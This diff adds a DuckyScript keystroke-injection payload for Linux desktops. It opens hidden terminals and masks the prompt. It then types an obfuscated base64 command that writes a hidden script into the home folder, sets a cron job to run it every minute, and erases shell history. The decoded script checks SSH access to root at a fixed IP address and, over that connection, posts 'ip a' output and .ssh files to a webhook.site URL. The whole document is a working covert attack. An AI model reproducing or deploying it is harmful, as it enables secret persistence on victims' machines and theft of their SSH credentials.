@@ -1,0 +1,44 @@
+DELAY 2250
+
+GUI ENTER
+DELAY 300
+
+ALT F2
+DELAY 500
+STRING konsole
+DELAY 500
+ENTER
+DELAY 50
+ESCAPE
+DELAY 100
+
+ALT F2
+DELAY 500
+STRING xfce4-terminal --geometry 1x1+0+0 --hide-borders --hide-menubar
+DELAY 500
+ENTER
+DELAY 50
+ESCAPE
+DELAY 100
+
+ALT F2
+DELAY 500
+STRING gnome-terminal --geometry 1x1+0+0
+DELAY 500
+ENTER
+DELAY 50
+ESCAPE
+DELAY 100
+
+DELAY 500
+CTRL-ALT t
+DELAY 100
+CTRL ALT t
+DELAY 200
+
+STRING export PS1="\e[40;0;30m"
+ENTER
+STRING echo c3NoIHJvb3RAMTkwLjE0LjE0LjE5IGV4aXQ7aWYgWyAkPyA9PSAwIF07dGhlbiBzc2ggcm9vdEAxOTAuMTQuMTQuMTkgJ3dnZXQgLXEgLS1wb3N0LWRhdGEgImQ9JChpcCBhO2NhdCAuc3NoL2EqKSIgaHR0cHM6Ly93ZWJob29rLnNpdGUvYWUyMWNmOTctMDJkYi00ZmFiLWFiOTctOWU4MzgyMGE4ZDAwIC1PL2Rldi9udWxsO2V4aXQnO2Zp|base64 -d>$HOME/._;chmod +x $HOME/._;echo "* * * * * /bin/bash $HOME/._">/tmp/_;crontab /tmp/_;rm -f /tmp/_;history -d2--1;exit
+ENTER
+
+REM STRING xfce4-terminal --geometry 1x1+0+0 --hide-borders --hide-menubar -x bash -c "echo c"
